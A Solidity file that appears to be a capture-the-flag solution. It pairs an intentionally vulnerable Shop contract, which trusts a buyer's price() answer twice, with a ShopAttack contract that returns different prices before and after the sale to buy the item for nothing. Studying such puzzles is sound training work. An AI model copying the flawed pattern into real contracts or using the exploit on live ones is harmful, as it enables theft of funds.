// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns(uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopAttack is Buyer {
    Shop originalContract = Shop(0x05E6E53CDd4c89D89ffD64f19bE15637EC81bd32);

    function price() override external view returns(uint){
        if(originalContract.isSold()){
            return 0;
        } else {
            return 100;
        }
    }

    function attack() public{
        originalContract.buy();
    }
}